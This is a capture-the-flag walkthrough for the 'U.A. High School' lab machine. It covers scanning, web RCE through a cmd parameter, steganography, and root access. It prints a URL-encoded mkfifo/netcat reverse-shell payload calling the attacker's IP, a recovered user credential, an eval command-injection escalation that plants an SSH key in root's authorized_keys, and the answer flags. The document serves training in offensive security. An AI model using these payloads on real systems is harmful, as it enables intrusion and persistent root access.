# U.A. High School
This machine was actually really difficult for me, and at some point I had to look for hints in other walkthroughs<br />
(Flags are at the end of the writeup)

### U.A. High School
Initial scan shows port 22 and 80 open:

    # Nmap 7.94SVN scan initiated Tue Oct 29 09:54:33 2024 as: nmap -p22,80 -sV -sC -oN scan 10.10.3.157
    Nmap scan report for 10.10.3.157
    Host is up (0.059s latency).
    
    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 58:2f:ec:23:ba:a9:fe:81:8a:8e:2d:d8:91:21:d2:76 (RSA)
    |   256 9d:f2:63:fd:7c:f3:24:62:47:8a:fb:08:b2:29:e2:b4 (ECDSA)
    |_  256 62:d8:f8:c9:60:0f:70:1f:6e:11:ab:a0:33:79:b5:5d (ED25519)
    80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
    |_http-title: U.A. High School
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Enumerating the webpage, I found a `/assets` directory. Inside it, using gobuster, I found `/assets/index.php`. This page was empy and I didn't know how to move on, so I used `dirsearch` to scan this directory. <br />
![image](https://github.com/user-attachments/assets/0c273fc3-9a25-473b-b3ea-e3b4b97a9489)<br />
cmd=dir, uh. If I substitute it with cmd=whomai, I get back the following string `d3d3LWRhdGEK`, which is the base64 encoded version of www-data. This is a RCE; no idea where it came from but I'll accept it. Time to get a reverse shell.<br />
Open a netcat listener on the attacker's machine. The payload that worked for me is `http://10.10.174.239/assets/index.php/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=rm%20/tmp/f;mkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.11.108.100%204444%20%3E%2Ftmp%2Ff`.<br />
Visiting the web page directory, I found a Hidden_Content folder: <br />
![image](https://github.com/user-attachments/assets/a0d7e833-0e2c-4140-9e2b-cb7f2441b708)<br />
Which is `AllmightForEver!!!` encoded in base64.<br />
At this point I had to look to another walkthough, I didn't how to move on. I thought I enumerated everything. But the right path was actually examining the images inside `/assets/images`. <br />
I transfered them in my machine with netcat:<br />
![image](https://github.com/user-attachments/assets/27d43c86-afdb-45f0-87cc-5f7fbd17a462)<br />
`yuei.jpg` is the background of the page, while `oneforall.jpg` has some bug because I can't open it. Now that I think about it, there was no other image besides the yuei school on the web page. So maybe it makes sense to get suspicious when looking at an unseen image.<br />
But I mean cmon.. <br />
Moving on, let's try to fix this image. If we open the image with `hexeditor` we can see that it has the signature of a `.png` file, and not of a `.jpg` file. So we have to fix the signature:<br />
![image](https://github.com/user-attachments/assets/e072e3e7-df38-4473-8298-30a40bf12171)<br />
Now that the signature is fixed, I can actually see the image:<br />
![image](https://github.com/user-attachments/assets/c6bd2076-724c-4fde-8df2-d0b1c81be653)<br />
So now the idea is to find hidden information inside this image. This practice is called steganography. There's a tool on kali for this, called `steghide`. The command to extract data is: `steghide --extract -sf oneforall.jpg`. 
It asks for a passphrase, use `AllmightForEver!!!`<br />
![image](https://github.com/user-attachments/assets/ebb549ca-714f-412e-9031-cda307ceea86)<br />
`deku:One?For?All_!!one1/A`. This is how we get `user.txt`. Running `sudo -l` shows the following:<br />
![image](https://github.com/user-attachments/assets/a10097c9-8746-49b4-ac9d-7db871be4e5d)<br />
The code of `feedback.sh` seems to run the `eval` function with `eval "echo $feedback"`, where $feedback is our input. Since `>` and `/` are not filtered, I can submit something like `hello > /tmp/out.txt` and it should work:<br />
![image](https://github.com/user-attachments/assets/9008c87b-465a-43d5-82f2-be439c30b814)<br />
So to exploit this, we can create a set of keys with ssh-keygen, and insert the public key inside the `authorized_keys` file inside `/root/.ssh`. So, create the keys with `ssh-keygen -t rsa -b 2048 -f id_rsa_ua`. Then copy the public key and run `sudo ./feedback.sh` and submit the following payload:

    pub_key > /root/.ssh/authorized_keys
Now run `chmod +x id_rsa_ua` and log into root's account with `ssh root@IP -i id_rsa_ua`<br />
![image](https://github.com/user-attachments/assets/e53a9352-a7bb-4437-bd8a-055c312c4954)<br />




- What is the user.txt flag? `THM{W3lC0m3_D3kU_1A_0n3f0rAll??}`
- What is the root.txt flag? `THM{Y0U_4r3_7h3_NUm83r_1_H3r0}`
